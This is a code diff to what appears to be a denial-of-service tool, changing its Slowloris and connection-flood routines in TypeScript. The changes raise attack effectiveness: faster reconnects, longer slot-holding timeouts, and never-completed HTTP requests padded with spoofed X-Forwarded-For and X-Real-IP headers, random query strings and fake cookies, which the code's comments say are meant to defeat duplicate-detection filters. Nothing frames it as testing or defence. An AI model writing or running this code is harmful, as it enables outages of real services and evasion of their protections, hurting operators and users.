@@ -757,10 +757,11 @@ async function runSlowlorisReal(
   onStats: (p: number, b: number, c?: number) => void,
   useHttps = false,
 ): Promise<void> {
-  const MAX_CONN = Math.min(threads * 80, 25000); // 83K FDs available — use 25K max
+  // 80 connections per thread establishes quickly, refires at 10-25s (slowloris interval)
+  const MAX_CONN = Math.min(threads * 80, 20000);
   let localPkts = 0, localBytes = 0, activeConns = 0;
   const flush = () => { onStats(localPkts, localBytes, activeConns); localPkts = 0; localBytes = 0; };
-  const flushIv = setInterval(flush, 300);
+  const flushIv = setInterval(flush, 250);
 
   const runSock = (): Promise<void> => new Promise(resolve => {
     if (signal.aborted) { resolve(); return; }
@@ -859,20 +860,24 @@ async function runConnFlood(
   onStats: (p: number, b: number, c?: number) => void,
   useHttps = false,
 ): Promise<void> {
-  const MAX_CONN = Math.min(threads * 100, 30000);
+  // Cap at manageable number — too many simultaneous TLS handshakes stall the event loop
+  // 60 connections per thread ensures all establish quickly (< 3s ramp) then cycle at 5-20ms
+  const MAX_CONN = Math.min(threads * 60, 15000);
   let localPkts = 0, localBytes = 0, activeConns = 0;
   const flush = () => { onStats(localPkts, localBytes, activeConns); localPkts = 0; localBytes = 0; };
-  const flushIv = setInterval(flush, 300);
+  const flushIv = setInterval(flush, 250);
 
   const runSock = (): Promise<void> => new Promise(resolve => {
     if (signal.aborted) { resolve(); return; }
 
     const sock: net.Socket = useHttps
-      ? tls.connect({ host: resolvedHost, port: targetPort, servername: hostname, rejectUnauthorized: false })
+      ? tls.connect({ host: resolvedHost, port: targetPort, servername: hostname, rejectUnauthorized: false,
+          ciphers: "TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:ECDHE-RSA-AES128-GCM-SHA256",
+        })
       : net.createConnection({ host: resolvedHost, port: targetPort });
 
     sock.setNoDelay(true);
-    sock.setTimeout(90_000);
+    sock.setTimeout(120_000); // 2-minute hold — maximizes time connection slot is occupied
 
     let settled = false;
     const cleanup = () => {
@@ -881,19 +886,29 @@ async function runConnFlood(
       try { sock.destroy(); } catch { /**/ }
       if (signal.aborted) { settled = true; resolve(); return; }
       settled = true;
-      // Small jitter before reconnect to prevent thundering herd
-      setTimeout(() => runSock().then(resolve), randInt(50, 300));
+      // Minimal jitter — reconnect fast to maintain connection density
+      setTimeout(() => runSock().then(resolve), randInt(5, 20));
     };
 
     const onConnected = () => {
       activeConns++;
       localPkts++;
-      // Send just enough to look like a real connection but never complete the request
-      // This wastes a connection slot on the server side indefinitely
-      const minReq = `GET ${hotPath()} HTTP/1.1\r\nHost: ${hostname}\r\nUser-Agent: ${randUA()}\r\n`;
+      // Incomplete HTTP/1.1 request — server holds thread waiting for rest of headers
+      // Varying paths and IPs defeats simple duplicate-detection filters
+      const minReq = [
+        `GET ${hotPath()}?_=${randStr(8)} HTTP/1.1`,
+        `Host: ${hostname}`,
+        `User-Agent: ${randUA()}`,
+        `Accept: text/html,application/xhtml+xml,*/*;q=0.9`,
+        `Accept-Encoding: gzip, deflate, br`,
+        `X-Forwarded-For: ${randIp()}`,
+        `X-Real-IP: ${randIp()}`,
+        `Connection: keep-alive`,
+        `Cookie: session=${randHex(32)}; _ga=GA1.${randInt(1,9)}.${randInt(100000000,999999999)}.${Date.now()}`,
+        ``, // intentionally NO final \r\n — server waits forever
+      ].join("\r\n");
       sock.write(minReq);
       localBytes += minReq.length;
-      // DO NOT send the final \r\n — server waits for rest of headers forever
     };
 
     if (useHttps) {
